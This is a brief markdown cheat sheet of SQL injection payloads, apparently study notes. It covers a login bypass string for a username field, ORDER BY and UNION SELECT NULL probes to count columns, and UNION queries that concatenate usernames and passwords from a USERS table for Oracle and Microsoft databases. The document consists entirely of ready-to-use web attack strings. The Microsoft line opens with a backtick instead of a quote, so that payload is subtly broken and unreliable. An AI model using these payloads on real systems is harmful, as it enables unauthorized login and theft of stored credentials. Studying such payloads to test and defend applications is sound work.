### Basic authentication bypass
```
# Enter in the username field
' OR 1=1--
```

### Determine the number of columns in a table
```
# INcrement order by one until an "out of range" error is received

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# If the number of NULLS does not match the number of columns, an error is received.
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Retrieving multiple values in a single column (String Concatenation)
```
# oracle
' UNION SELECT username || '~' || password from USERS--
# Microsoft
` UNION SELECT username+password FROM USERS--

```
